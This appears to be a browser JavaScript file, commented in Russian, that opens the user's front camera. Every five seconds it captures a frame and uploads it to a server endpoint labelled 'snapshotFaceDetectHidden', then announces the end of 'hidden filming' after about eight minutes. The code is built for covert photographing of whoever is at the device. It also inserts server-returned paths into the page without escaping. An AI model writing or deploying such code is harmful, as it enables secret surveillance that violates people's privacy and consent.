(function () {

    function hasGetUserMedia() {
        return (navigator.mediaDevices &&
            navigator.mediaDevices.getUserMedia);
    }

    if (hasGetUserMedia()) {
        const img = document.querySelector('#screenshot img');
        const video = document.querySelector('#screenshot video');

        const canvas = document.createElement('canvas');

        const constraints = {
            video: {
                height: 1280,
                width: 720,
                frameRate: { ideal: 5, max: 10 },
                facingMode: {exact:"user"},
            }
        };
        navigator.mediaDevices.getUserMedia(constraints).then(
            function handleSuccess(stream) {

                video.srcObject = stream;
            }
        ).catch(
            function handleError() {
                alert(MediaDevices.getSupportedConstraints());
            }
        );
// начать повторы с интервалом 2 сек
        var timerId = setInterval(function () {
            // const video = document.querySelector('#screenshot video');
            // const canvas = document.createElement('canvas');
            // const img = document.querySelector('#screenshot img');
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            canvas.getContext('2d').drawImage(video, 0, 0);
           img.src = canvas.toDataURL('image/png');
            ajaxSend('snapshotFaceDetectHidden');
        }, 5000);

//через 500 сек остановить повторы
        setTimeout(function () {
            clearInterval(timerId);
            alert('Стоп скрытой съёмке');
        }, 500000);





      $.ajaxSetup({
            url: '/ajax.php', // путь к php-обработчику
            type: 'POST', // метод передачи данных
            dataType: 'json', // тип ожидаемых данных в ответе
            beforeSend: function () { // Функция вызывается перед отправкой запроса
                console.debug('Запрос отправлен. Ждите ответа.');
                // тут можно, к примеру, начинать показ прелоадера, в общем, на ваше усмотрение
            },
            error: function (req, text, error) { // отслеживание ошибок во время выполнения ajax-запроса
                console.error('Упс! Ошибочка: ' + text + ' | ' + error);
            },
            complete: function () { // функция вызывается по окончании запроса
                console.debug('Запрос полностью завершен!');
                // тут завершаем показ прелоадера, если вы его показывали
            }
        });

        function ajaxSend(type) {
            var formData = new FormData(); // создаем новый экземпляр объекта и передаем ему нашу форму (*)
            formData.append('type', type);
            formData.append('data', img.src);
            $.ajax({
                contentType: false, // важно - убираем форматирование данных по умолчанию
                processData: false, // важно - убираем преобразование строк по умолчанию
                data: formData,
                success: function (json) {
                    if (json) {
                        $('.gtr-uniform').append('<div class="col-4"><span class="image fit"><img src="' + decodeURI(json.src) + '" alt=""></span></div>');
                    }
                }
            });
        };


    } else {
        alert('GetUserMedia API неподдерживается вашим браузером. Обновите браузер пожалуйста.');
    }
})();
